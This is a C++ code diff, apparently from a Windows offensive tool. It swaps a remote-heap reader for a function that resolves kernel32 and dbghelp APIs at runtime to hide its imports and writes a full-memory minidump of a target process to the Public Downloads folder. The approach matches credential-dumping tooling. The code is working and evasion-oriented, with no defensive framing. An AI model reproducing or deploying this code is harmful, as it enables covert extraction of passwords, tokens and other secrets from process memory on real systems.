@@ -12,6 +12,11 @@
 // definitions
 #define SW_SHOWNORMAL 0x1
 
+// general
+typedef HMODULE(WINAPI* LoadLibraryAPtr)(
+    LPCSTR lpLibFileName
+    );
+
 // proc functions
 typedef HANDLE(*OpenProcessPtr)(
     DWORD dwDesiredAccess,
@@ -45,10 +50,27 @@ typedef NTSTATUS(*NtReadVirtualMemoryPtr)(
     PSIZE_T NumberOfBytesRead
     );
 
-// message functions
-typedef HMODULE (*LoadLibraryAPtr)(
-    LPCSTR lpLibFileName
+// minidump
+typedef HANDLE(*CreateFileAPtr)(
+    LPCSTR                lpFileName,
+    DWORD                 dwDesiredAccess,
+    DWORD                 dwShareMode,
+    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
+    DWORD                 dwCreationDisposition,
+    DWORD                 dwFlagsAndAttributes,
+    HANDLE                hTemplateFile
     );
+typedef BOOL(WINAPI *MiniDumpWriteDumpPtr)(
+    HANDLE        hProcess,
+    DWORD         ProcessId,
+    HANDLE        hFile,
+    MINIDUMP_TYPE DumpType,
+    PVOID         ExceptionParam,
+    PVOID         UserStreamParam,
+    PVOID         CallbackParam
+    );
+
+// message functions
 typedef INT (*MessageBoxAPtr)(
     HWND   hWnd, 
     LPCSTR lpText, 
@@ -138,44 +160,38 @@ namespace utils {
         return h;
     }
 
-    bool read_process_heap(HANDLE h, LPVOID outBuffer, SIZE_T outBufferSize) {
-        auto ntdll = GetDllFromMemory(L"ntdll.dll");
-        if (!ntdll) return false;
+    bool proc_mini_dump(HANDLE hProc, DWORD pid) {
+        char outFile[] = "C:\\Users\\Public\\Downloads\\out.dmp";
 
-        auto ZwQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddr(ntdll, "ZwQueryInformationProcess");
-        if (!ZwQueryInformationProcess) return false;
+        auto kernel32 = GetDllFromMemory(L"kernel32.dll");
+        if (!kernel32) return false;
 
-        auto NtReadVirtualMemory = (NtReadVirtualMemoryPtr)GetProcAddr(ntdll, "NtReadVirtualMemory");
-        if (!NtReadVirtualMemory) return false;
+        LoadLibraryAPtr LoadLibraryA = (LoadLibraryAPtr)GetProcAddr(kernel32, "LoadLibraryA");
+        if (!LoadLibraryA) return false;
 
-        // Retrieve PEB of remote process
-        PROCESS_BASIC_INFORMATION pbi = { 0 };
-        ULONG outLen = 0;
+        HMODULE hModule = LoadLibraryA("dbghelp.dll");
+        if (hModule == NULL) return false;
 
-        if (ZwQueryInformationProcess(h, ProcessBasicInformation, &pbi, sizeof(pbi), &outLen) != STATUS_SUCCESS) {
+        HMODULE h1 = LoadLibraryA("dbgcore.dll"); // dbghelp depends on this
+        if (!h1) return false;
+
+        HMODULE h2 = LoadLibraryA("rpcrt4.dll"); // dbghelp depends on this
+        if (!h2) return false;
+
+        CreateFileAPtr CreateFileA = (CreateFileAPtr)GetProcAddr(kernel32, "CreateFileA");
+        if (!CreateFileA) return false;
+
+        MiniDumpWriteDumpPtr MiniDumpWriteDump = (MiniDumpWriteDumpPtr)GetProcAddr(hModule, "MiniDumpWriteDump");
+        if (!MiniDumpWriteDump) return false;
+
+        HANDLE hFile = CreateFileA(outFile, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) {
             return false;
         }
-
-        // Read remote PEB structure
-        PEB remotePEB = { 0 };
-        SIZE_T bytes = 0;
-
-        if (NtReadVirtualMemory(h, pbi.PebBaseAddress, &remotePEB, sizeof(remotePEB), &bytes) != STATUS_SUCCESS) {
-            return false;
-        }
-
-        // Remote process default heap
-        PVOID remoteHeap = remotePEB.ProcessHeap;
-        if (!remoteHeap) return false;
-
-        // Read the beginning of the heap
-        SIZE_T toRead = outBufferSize;
-
-        NTSTATUS st = NtReadVirtualMemory(h, remoteHeap, outBuffer, toRead,&bytes);
-        if (st == STATUS_SUCCESS) {
-            return true;
-        }
-        return false;
+        message("after create", "mini");
+        BOOL ret = MiniDumpWriteDump(hProc, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+        message("after write", "mini");
+        return ret == TRUE;
     }
 
 }
